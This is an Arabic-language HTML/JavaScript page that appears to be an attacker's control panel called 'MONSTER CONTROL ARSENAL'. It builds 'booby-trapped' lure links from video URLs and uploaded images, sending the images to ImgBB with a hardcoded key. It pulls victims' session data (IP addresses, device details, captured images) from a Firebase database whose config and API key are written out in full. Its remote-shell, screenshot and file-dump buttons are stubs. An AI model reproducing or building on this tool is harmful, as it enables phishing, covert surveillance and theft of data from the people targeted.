<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>THE DOCTOR | MONSTER CONTROL ARSENAL v3.0</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #050505; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: grid; grid-template-columns: 1fr 1fr; grid-template-rows: 1fr 1fr; height: 100vh; gap: 5px; overflow: hidden; }
        .section { border: 1px solid var(--neon); padding: 10px; overflow-y: auto; background: rgba(0,255,65,0.02); }
        .title { border-bottom: 1px solid var(--neon); padding-bottom: 5px; text-align: center; font-weight: bold; font-size: 0.9em; color: #fff; }
        input, button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 8px; width: 100%; margin-top: 5px; font-size: 0.8em; }
        button:hover { background: var(--neon); color: #000; cursor: pointer; }
        .card { border: 1px solid #333; padding: 5px; margin-top: 5px; font-size: 0.7em; background: #000; }
        .screen-view { width: 100%; height: 150px; border: 1px solid #444; background: #111; margin-top: 5px; object-fit: contain; }
        .active { color: #0ff; font-weight: bold; }
    </style>
</head>
<body>

<div class="section">
    <div class="title">🛠️ مصنع التلغيم والروابط</div>
    <input type="text" id="link-in" placeholder="رابط الفيديو (YouTube/TikTok)">
    <button onclick="genLink()">توليد رابط صاعق</button>
    <hr>
    <p style="font-size: 0.7em;">تلغيم ملف صورة (Upload & Inject)</p>
    <input type="file" id="image-in" accept="image/*">
    <button onclick="injectImage()">تسييل الصورة وتلغيمها</button>
    <div id="out-path" style="font-size: 0.6em; color: #0ff; margin-top:5px;"></div>
</div>

<div class="section">
    <div class="title">📡 رادار الأجهزة والملفات</div>
    <div id="radar-list">
        <p style="font-size: 0.7em; color: #555;">[SEARCHING FOR SENSITIVE FILES...]</p>
    </div>
</div>

<div class="section">
    <div class="title">👁️ رادار استقبال الصور والجلسات</div>
    <div id="session-stream"></div>
</div>

<div class="section">
    <div class="title">🕹️ واجهة التحكم بالجهاز (Remote Shell)</div>
    <div id="target-info" style="font-size: 0.7em; color: #0ff;">بانتظار اختيار جهاز...</div>
    <div id="screen-monitor">
        <img id="live-screen" class="screen-view" src="https://via.placeholder.com/300x150/000/00ff41?text=NO+LIVE+FEED">
    </div>
    <button onclick="takeScreenshot()" style="background: #200;">سحب لقطة شاشة الآن</button>
    <button onclick="dumpFiles()" style="background: #020;">سحب الملفات الحساسة</button>
</div>

<script>
    // --- إعدادات المزامنة ---
    const firebaseConfig = {
        apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
        authDomain: "monster-system-7f67e.firebaseapp.com",
        projectId: "monster-system-7f67e",
        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
        storageBucket: "monster-system-7f67e.firebasestorage.app",
        messagingSenderId: "165431360308",
        appId: "1:165431360308:web:b0d7d626c67d4f38d68361"
    };
    const imgbb_key = "8841f217eb20461d8cd9d64a64a7c62d";
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // --- نظام الإدارة ---
    db.ref('sessions/').on('value', (snap) => {
        const data = snap.val();
        const stream = document.getElementById('session-stream');
        stream.innerHTML = '';
        for (let id in data) {
            const v = data[id];
            stream.innerHTML += `
                <div class="card" onclick="selectTarget('${id}', '${v.imgUrl}')">
                    <b>ID:</b> ${id.substring(0,6)}... <span class="active">[ON]</span><br>
                    <b>IP:</b> ${v.ip} | <b>SYS:</b> ${v.device}<br>
                    <img src="${v.imgUrl}" style="width: 50px;">
                </div>`;
        }
    });

    function selectTarget(id, img) {
        document.getElementById('target-info').innerText = "تحكم نشط في: " + id;
        document.getElementById('live-screen').src = img;
    }

    function genLink() {
        const url = document.getElementById('link-in').value;
        const final = window.location.href.split('?')[0] + `?m=sync&t=${btoa(url)}`;
        document.getElementById('out-path').innerText = "الرابط الملغم: " + final;
    }

    async function injectImage() {
        const file = document.getElementById('image-in').files[0];
        if(!file) return alert("اختر صورة أولاً!");
        document.getElementById('out-path').innerText = "[+] جاري تلغيم الصورة وحقن البايلوت...";
        // تقنية التلغيم: نرفع الصورة لـ ImgBB ونأخذ رابطها ونضعه كخلفية لـ SVG ملغم
        const reader = new FileReader();
        reader.onload = async (e) => {
            const base64 = e.target.result.split(',')[1];
            const formData = new FormData();
            formData.append('image', base64);
            const res = await fetch(`https://api.imgbb.com/1/upload?key=${imgbb_key}`, { method: 'POST', body: formData });
            const resData = await res.json();
            const payload = window.location.href.split('?')[0] + `?m=sync&t=${btoa(resData.data.url)}`;
            document.getElementById('out-path').innerHTML = `تم التلغيم! <a href="${payload}" style="color:#fff">رابط الصورة الملغمة</a>`;
        };
        reader.readAsDataURL(file);
    }

    // وحدة تنفيذية وهمية للتوضيح (التحكم يتطلب بايلوت APK)
    function takeScreenshot() { alert("جاري طلب لقطة شاشة من الجهاز..."); }
    function dumpFiles() { alert("جاري البحث عن ملفات .pdf, .jpg, .db..."); }
</script>
</body>
</html>
